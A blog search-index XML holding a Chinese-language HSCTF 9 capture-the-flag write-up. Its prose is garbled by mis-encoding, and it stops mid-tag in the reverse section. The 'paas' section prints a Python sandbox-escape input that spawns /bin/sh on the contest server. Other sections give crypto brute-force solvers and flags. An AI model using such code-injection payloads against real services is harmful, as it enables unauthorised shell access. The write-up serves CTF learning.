<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HSCTF 9</title>
    <link href="/2022/06/12/HSCTF-9/"/>
    <url>/2022/06/12/HSCTF-9/</url>
    
    <content type="html"><![CDATA[<p>HSCTF 9</p><span id="more"></span><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1><h2 id="the-great-directory-egg-hunt"><a class="markdownIt-Anchor" href="#the-great-directory-egg-hunt"></a> the-great-directory-egg-hunt</h2><p>Descriptionï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs livecodeserver">Lots <span class="hljs-keyword">of</span> branching paths, but how <span class="hljs-built_in">do</span> we <span class="hljs-built_in">get</span> <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> correct <span class="hljs-built_in">file</span>?<br></code></pre></td></tr></table></figure><p>é™„ä»¶æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ã€‚<br />è§£å‹åé‡Œé¢ç›®å½•å¾ˆå¤šã€‚æ¯ä¸ªå¶å­éƒ½æ˜¯ä¸€ä¸ªfile.txtæ–‡ä»¶ã€‚çœ‹æ¥æˆ‘ä»¬éœ€è¦åœ¨è¿™é‡Œé¢æ‰¾åˆ°æˆ‘ä»¬çš„flagã€‚<br />è¿™ä¸ªç›´æ¥ç”¨windowsè‡ªå¸¦çš„æœç´¢å°±è¡Œäº†ã€‚ä¸è¿‡è¦æ‰“å¼€æœç´¢æ–‡ä»¶å†…å®¹çš„é€‰é¡¹ã€‚</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">.\Tw\<span class="hljs-number">3</span>l\v3\_D\<span class="hljs-number">1</span>r\s_\D3\<span class="hljs-number">3</span>p\_6\Gi\TQ\Ez<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç›®å½•ä¸‹æ‰¾åˆ°äº†ç›¸å…³æ–‡ä»¶ã€‚å†…å®¹ä¸ºï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">If you followed <span class="hljs-keyword">the</span> <span class="hljs-built_in">directories</span> <span class="hljs-built_in">to</span> here, you have found <span class="hljs-keyword">the</span> flag!<br>Use <span class="hljs-keyword">the</span> <span class="hljs-built_in">directory</span> names (<span class="hljs-keyword">without</span> slashes) <span class="hljs-keyword">as</span> part <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> flag, <span class="hljs-keyword">then</span> <span class="hljs-keyword">wrap</span> <span class="hljs-keyword">it</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> flag <span class="hljs-built_in">format</span> <span class="hljs-string">&quot;flag&#123;&#125;&quot;</span>.<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆflagä¸ºï¼š</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Tw3lv3_D1rs_D33p_6GiTQEz&#125;</span><br></code></pre></td></tr></table></figure><h2 id="onchain-baller"><a class="markdownIt-Anchor" href="#onchain-baller"></a> onchain-baller</h2><p>Descriptionï¼š</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">Have <span class="hljs-keyword">this</span> Ropsten testnet address: <span class="hljs-number">0x339d58bff8b8C5dAAfaF08fA77ad39C7909B194E</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯ä»¥å¤ªåŠçš„é¢˜ã€‚ç»™äº†ä¸€ä¸ªè´¦æˆ·åœ°å€ã€‚æ‰¾æ‰¾çœ‹ã€‚<br /><a href="https://ropsten.etherscan.io/blocks">https://ropsten.etherscan.io/blocks</a><br />æœç´¢è¿™ä¸ªåœ°å€ã€‚å¯ä»¥æ‰¾åˆ°è¿™ä¸ªè´¦æˆ·ï¼Œè¿™é‡Œæœ‰éƒ¨åˆ†äº¤æ˜“è®°å½•ã€‚<br />åœ¨Txn Hashä¸º0xce01ddd8ad56b6b9b11796f9ebf1cd29e7034d82ff98978f2c4178a91a34cf46çš„äº¤æ˜“ä¸­ï¼Œå…¶input dataä¸ºï¼š</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">0</span>x68736374667b315f623431315f306e5f346e645f3066665f7468335f636834316e7d<br><br><span class="hljs-meta"># hsctf&#123;1_b411_0n_4nd_0ff_th3_ch41n&#125;</span><br></code></pre></td></tr></table></figure><h2 id="paas"><a class="markdownIt-Anchor" href="#paas"></a> paas</h2><p>Descriptionï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">Run</span> Python code <span class="hljs-keyword">from</span> anywhere! nc paas.hsctf.com 1337<br></code></pre></td></tr></table></figure><p>ncè¿ä¸Šåå‘ç°è¾“å…¥çš„ä»£ç éƒ½ä¼šè¢«æ‰§è¡Œã€‚ä½†æ˜¯ä»–è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ã€‚æ¯”å¦‚ &quot;./_â€™&quot;è¿™äº›ã€‚ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤æ‹¬å·ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‡½æ•°çš„ã€‚é‚£ä¹ˆç›´æ¥ä½¿ç”¨evalå’Œinputçš„ç»„åˆå°±å¯ä»¥æ‰§è¡ŒæŒ‡ä»¤äº†ã€‚</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">== proof-of-work: disabled ==</span><br>Python as a Service:<br>Execute arbitrary Python code (with certain restrictions)<br>&gt; eval(input())<br><span class="hljs-emphasis">__import__</span>(<span class="hljs-emphasis">&#x27;os&#x27;</span>).system(<span class="hljs-emphasis">&#x27;/bin/sh&#x27;</span>)<br>ls<br>flag<br>paas.py<br>cat flag<br>flag&#123;vuln3r4b1l17y_45_4_53rv1c3&#125;<br><br># flag&#123;vuln3r4b1l17y_45_4_53rv1c3&#125;<br></code></pre></td></tr></table></figure><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="lcvc"><a class="markdownIt-Anchor" href="#lcvc"></a> lcvc</h2><p>Descriptionï¼š</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">Ciphertext: mawhxyovhiiupukqnzdekudetmjmefkqjgmqndgtnrxqxludegwovdcdmjjhw Please wrap <span class="hljs-built_in">in</span> the <span class="hljs-built_in">flag</span> <span class="hljs-built_in">format</span>: <span class="hljs-built_in">flag</span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªé™„ä»¶ï¼Œæ˜¯åŠ å¯†ç®—æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">state = <span class="hljs-number">1</span><br>flag = <span class="hljs-string">&quot;[REDACTED]&quot;</span><br>alphabet = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="hljs-keyword">assert</span>(flag[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]+flag[-<span class="hljs-number">1</span>]==<span class="hljs-string">&quot;flag&#123;&#125;&quot;</span>)<br>ciphertext = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> character <span class="hljs-keyword">in</span> flag[<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>]:<br>    state = (<span class="hljs-number">15</span>*state+<span class="hljs-number">18</span>)%<span class="hljs-number">29</span><br>    ciphertext+=alphabet[(alphabet.index(character)+state)%<span class="hljs-number">26</span>]<br><span class="hljs-built_in">print</span>(ciphertext)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥çˆ†ç ´å°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"> state = <span class="hljs-number">1</span><br>alphabet = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br>c = <span class="hljs-string">&quot;mawhxyovhiiupukqnzdekudetmjmefkqjgmqndgtnrxqxludegwovdcdmjjhw&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c :<br>    state = (<span class="hljs-number">15</span> * state + <span class="hljs-number">18</span>) % <span class="hljs-number">29</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> alphabet:<br>        <span class="hljs-keyword">if</span> alphabet[(alphabet.index(j)+state)%<span class="hljs-number">26</span>] == i:<br>            <span class="hljs-built_in">print</span>(j, end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># iguessthisiswhatyouwouldcallalinearcongruentialvigenerecipher</span><br><span class="hljs-comment"># flag&#123;iguessthisiswhatyouwouldcallalinearcongruentialvigenerecipher&#125;</span><br></code></pre></td></tr></table></figure><h2 id="quagmire-i"><a class="markdownIt-Anchor" href="#quagmire-i"></a> quagmire-i</h2><p>Descriptionï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Bob was <span class="hljs-keyword">on</span> his way <span class="hljs-keyword">to</span> school <span class="hljs-keyword">and</span> go <span class="hljs-keyword">to</span> Mr. Connollyâ€™s <span class="hljs-keyword">first</span> period AP CSA <span class="hljs-built_in">class</span>, <span class="hljs-keyword">but</span> <span class="hljs-keyword">it</span> was a rainy <span class="hljs-built_in">day</span> <span class="hljs-keyword">and</span> he got stuck <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> quagmire <span class="hljs-keyword">in</span> his town, making him late <span class="hljs-keyword">to</span> school (specifically <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> closest <span class="hljs-keyword">to</span> his home, there are apparently four quagmires <span class="hljs-keyword">in</span> his town)! Could you figure out what Mr. Connolly told Bobâ€™s <span class="hljs-built_in">class</span>? His classmate Alice sent this <span class="hljs-built_in">text</span> message <span class="hljs-keyword">after</span> <span class="hljs-built_in">class</span> (written <span class="hljs-keyword">in</span> Quagmire I):<br>```<br>Plaintext keyword: CONNOLLYROCKS<br>Indicator keyword: HSCTF<br>Indicator position: A<br>Ciphertext: LZXORNZBUYWNRARNOVGCLSQWJEFJFE<br>```<br>(Please wrap <span class="hljs-keyword">the</span> flag <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> flag format â€œflag&#123;&#125;â€, <span class="hljs-keyword">and</span> use only uppercase letters within <span class="hljs-keyword">the</span> braces.)<br></code></pre></td></tr></table></figure><p>ä¸è®¤è¯†çš„åŠ å¯†ï¼Œé—®é—®è°·æ­Œå¥½äº†ã€‚æ‰¾åˆ°ä¸€ä¸ªè§£å¯†çš„ã€‚</p><p><a href="https://mysterytoolbox.organisingchaos.com/Ciphers/cipher/QuagmireI">https://mysterytoolbox.organisingchaos.com/Ciphers/cipher/QuagmireI</a></p><p>Keyed Alphabet keyå’ŒVigenere Keyåˆ†åˆ«æ˜¯CONNOLLYROCKSå’ŒHSCTFã€‚è§£å¯†å³å¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">FILLTHISBOWLWITHYOURFAVEFRUITS</span><br><br><span class="hljs-comment"># flag&#123;FILLTHISBOWLWITHYOURFAVEFRUITS&#125;</span><br></code></pre></td></tr></table></figure><h2 id="baby-baby-rsa"><a class="markdownIt-Anchor" href="#baby-baby-rsa"></a> baby-baby-rsa</h2><p>Descriptionï¼š</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">You should <span class="hljs-keyword">do</span> <span class="hljs-keyword">this</span> <span class="hljs-keyword">by</span> hand.<br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ªé™„ä»¶ä¸€ä¸ªç®—æ³•ä¸€ä¸ªè¾“å‡ºã€‚è¿™é‡Œæˆ‘æ”¾ä¸€èµ·äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>pt = bytes_to_long(flag)<br>bits = <span class="hljs-number">768</span><br>p,q = getPrime(bits),getPrime(bits)<br>n = p*q<br>e = <span class="hljs-number">0x10001</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(pt,e,n))<br>bit_p = <span class="hljs-built_in">bin</span>(p)[<span class="hljs-number">2</span>:]<br>bit_q = <span class="hljs-built_in">bin</span>(q)[<span class="hljs-number">2</span>:]<br>parts = [bit_p[<span class="hljs-number">0</span>:bits//<span class="hljs-number">3</span>],bit_p[bits//<span class="hljs-number">3</span>:<span class="hljs-number">2</span>*bits//<span class="hljs-number">3</span>],bit_p[<span class="hljs-number">2</span>*bits//<span class="hljs-number">3</span>:bits],bit_q[<span class="hljs-number">0</span>:bits//<span class="hljs-number">3</span>],bit_q[bits//<span class="hljs-number">3</span>:<span class="hljs-number">2</span>*bits//<span class="hljs-number">3</span>],bit_q[<span class="hljs-number">2</span>*bits//<span class="hljs-number">3</span>:bits]]<br>random.shuffle(parts)<br><span class="hljs-built_in">print</span>(parts)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">54794426723900547461854843163768660308115034417111329528183606035659639395104723918632912086419836023341428265596988959206660015436864401403237748771765948022232575597127381504670391300908215025163138869313954305720403722718214862988965792884236612959443476803344992121865817757791519151566895512058656532409472494022672998848036223706004788146906885182892250477746430460414866512005225936680732094537985671236900243908114730784290372829952741399684135984046796</span><br><span class="hljs-string">[&#x27;0100101100001100010110110001000001001110010110110011101111100001101100000101000011111000101110011010010100101100011111000000101010011101100101010000101101110100100010101011100110001010001000000001000110000111011110011001101111110000100010000110000001110011&#x27;, &#x27;1100001100001100111110011110110101001100100000000100000100011110110010010101000011111111000100001000111001100110010010010011110110110010010110110100010110100011011100101001100001010111000100000110101010101011011110110110101010110100011110010000101010000111&#x27;, &#x27;1000100010110110010100111010100100111000100111100101100001011111100011000111110011101011011011100000101011000111010110010010011110100100110000001101110111001000000111100111011011000101010001111101000111100111110010011101011111100100111111011011110110101111&#x27;, &#x27;1111001101111101111111111111001010001111100010100000010110011011100000000110010110000011011110101110001000001111110101101101111000000111101111111000011101011010000110111100000110000001001101101010100000010011000100010111100001011000101101111000101101110100&#x27;, &#x27;1100100000100001010111110010000011000010100110101111100100011010111111110100011011111100001011101001010000100111100011100111000101110001001011110000000000000000000110111100000111100000111111010110010011000010011000110111001010000110011011111101011110000101&#x27;, &#x27;0001101000011011010011100100000011010101110110111001111011000001010101101111110100011011010011111010001111011011100011111110101110101101111100100011111110011111010100001100011000111011010111110101000011110101011110110001011110001111011001101100110100000101&#x27;]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯æŠŠpqå„æ‹†æˆ3ä»½æ··åœ¨ä¸€èµ·äº†ã€‚æ‰€ä»¥æšä¸¾ä¸€ä¸‹å°±å¯ä»¥è§£å†³ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> libnum<br><br>c = ...<br>parts = [...]<br>e = <span class="hljs-number">0x10001</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(parts, <span class="hljs-number">3</span>):<br>    p = libnum.s2n(libnum.b2s(<span class="hljs-string">&quot;&quot;</span>.join(i)))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> sympy.isprime(p):<br>        <span class="hljs-keyword">continue</span><br>    d = sympy.mod_inverse(e, p-<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">pow</span>(c,d,p)))<br>    <br><span class="hljs-comment"># b&#x27;flag&#123;flbg&#123;flcg&#123;fldg&#123;fleg&#125;&#125;&#125;&#125;&#x27;</span><br><span class="hljs-comment"># b&#x27;flag&#123;flbg&#123;flcg&#123;fldg&#123;fleg&#125;&#125;&#125;&#125;&#x27;</span><br><span class="hljs-comment"># flag&#123;flbg&#123;flcg&#123;fldg&#123;fleg&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="otp"><a class="markdownIt-Anchor" href="#otp"></a> otp</h2><p>Descriptionï¼š</p><figure class="highlight mizar"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mizar">&quot;the one-time pad (OTP) <span class="hljs-keyword">is</span> an encryption technique <span class="hljs-keyword">that</span> cannot <span class="hljs-keyword">be</span> cracked&quot; - Wikipedia<br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ªæ–‡ä»¶ä¸€ä¸ªè¾“å‡ºä¸€ä¸ªä»£ç ï¼Œæ”¾ä¸€èµ·äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secure_seed</span>():<br>x = <span class="hljs-number">0</span><br><span class="hljs-comment"># x is a random integer between 0 and 100000000000</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000000</span>):<br>x += random.randint(<span class="hljs-number">0</span>, random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>))<br><span class="hljs-keyword">return</span> x<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>flag = bytes_to_long(flag)<br><br>random.seed(secure_seed())<br><br>l = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(flag)) - <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(l)<br><br>k = random.getrandbits(l)<br>flag = flag ^ k <span class="hljs-comment"># super secure encryption</span><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment"># 328</span><br><span class="hljs-comment"># 444466166004822947723119817789495250410386698442581656332222628158680136313528100177866881816893557</span><br></code></pre></td></tr></table></figure><p>æ²¡æœ‰å•¥æ€è·¯ï¼Œåªèƒ½ç ´è§£è¿™ä¸ªsecure_seedæ˜¯ä»€ä¹ˆäº†ã€‚è¿™ä¸ªéšæœºæ•°çš„ç”Ÿæˆæ–¹å¼å¾ˆå¥‡æ€ªã€‚åº”ä¸ºè¿™æ ·ç”Ÿæˆå‡ºæ¥çš„éšæœºæ•°å¹¶ä¸æ˜¯åœ¨0~100000000000çš„ï¼Œè€Œæ˜¯åœ¨25000000000é™„è¿‘çš„ã€‚è¿™ä¸ªç»“è®ºä½ è·‘ä¸€ä¸ªå°è§„æ¨¡çš„æµ‹è¯•å°±èƒ½çŸ¥é“ã€‚å³ä½¿è¿™æ ·æˆ‘ä»¬å¾ˆéš¾å»éå†ä»–çš„å‘¨å›´ï¼Œäº¿çº§åˆ«çš„æœç´¢ç©ºé—´ï¼Œå¥½åƒä¹Ÿè¿˜æ˜¯èƒ½éå†çš„ã€‚è¿™è¾¹ä»–ç”Ÿæˆå‡ºæ¥çš„lè¿˜æ¯”flagå¤šä¸€ä½ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥ï¼Œè¿™é‡Œéš¾é“æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„åœ°æ–¹å—ã€‚</p><p>å°è¯•çˆ†ç ´ä¸€ä¸‹å§ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> libnum<br><br>start = <span class="hljs-number">100000000000</span>//<span class="hljs-number">4</span><br>l = <span class="hljs-number">328</span><br>cipher = <span class="hljs-number">444466166004822947723119817789495250410386698442581656332222628158680136313528100177866881816893557</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):<br>    random.seed(start + i)<br>    k = random.getrandbits(l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;flag&quot;</span> <span class="hljs-keyword">in</span> libnum.n2s(cipher^k):<br>        <span class="hljs-built_in">print</span>(start + i)<br>        <span class="hljs-built_in">print</span>(libnum.n2s(cipher^k))<br>        <span class="hljs-keyword">break</span><br><br>    random.seed(start - i)<br>    k = random.getrandbits(l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;flag&quot;</span> <span class="hljs-keyword">in</span> libnum.n2s(cipher ^ k):<br>        <span class="hljs-built_in">print</span>(start - i)<br>        <span class="hljs-built_in">print</span>(libnum.n2s(cipher ^ k))<br>        <span class="hljs-keyword">break</span><br>        <br><span class="hljs-comment"># 25000212790</span><br><span class="hljs-comment"># b&#x27;flag&#123;c3ntr4l_l1m1t_th30r3m_15431008597&#125;\r\n&#x27;</span><br><br><span class="hljs-comment"># flag&#123;c3ntr4l_l1m1t_th30r3m_15431008597&#125;</span><br></code></pre></td></tr></table></figure><p>ç¡®å®å¯ä»¥è·‘å‡ºæ¥ã€‚</p><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="adding"><a class="markdownIt-Anchor" href="#adding"></a> adding</h2><p>Descriptionï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">This program <span class="hljs-keyword">is</span> taking too long... oh well addition <span class="hljs-keyword">is</span> too hard <span class="hljs-keyword">for</span> <span class="hljs-keyword">me</span><br><br>Please wrap <span class="hljs-keyword">the</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> proper flag format (flag&#123;&#125;).<br></code></pre></td></tr></table></figure><p>çœ‹çœ‹ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func1</span>(<span class="hljs-params">require = [], go = <span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> go:<br>        require.append(<span class="hljs-number">20</span>)<br>        <span class="hljs-keyword">return</span> require<br>        <br>    add = func1(go = <span class="hljs-literal">True</span>)<br>    require += add<br>    <span class="hljs-keyword">return</span> require<br><br>add = <span class="hljs-number">10</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">therealreal</span>(<span class="hljs-params">update</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">modify</span>(<span class="hljs-params">require = []</span>):<br>        require += update()<br>        <br>        <span class="hljs-keyword">global</span> add<br>        require.append(add)<br>        add += <span class="hljs-number">10</span><br>        <span class="hljs-keyword">return</span> require<br>    <br>    <span class="hljs-keyword">return</span> modify<br>    <br>use = therealreal(func1)<br>upto = <span class="hljs-number">213</span><br><br>calc = use()<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, upto+<span class="hljs-number">1</span>):<br>    calc = use(calc)<br>    <br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">sum</span>(calc))<br><br></code></pre></td></tr></table></figure><p>pythonæ˜¯çœŸçš„èƒ½å†™å‡ºèŠ±æ¥â€¦</p><p>æ‰‹åŠ¨åˆ†æåˆ†æçš„æˆ‘äº‘é‡Œé›¾é‡Œçš„ï¼Œæœ‰äº›å˜é‡çš„å˜åŒ–å®Œå…¨æä¸æ‡‚â€¦ä¸å¦‚æ¥ç›´æ¥çœ‹ç»“æœã€‚</p><p>æˆ‘å…ˆè®²uptoæ”¹æˆäº†3ç„¶åè®²calcæ‰“å°å‡ºæ¥çœ‹çœ‹ã€‚</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[</span><br><span class="hljs-string">20, 20, 10, </span><br><span class="hljs-string">20, 20, 20, 20, 20, 20, 20, </span><br><span class="hljs-string">20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 30, </span><br><span class="hljs-string">20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 40</span><br><span 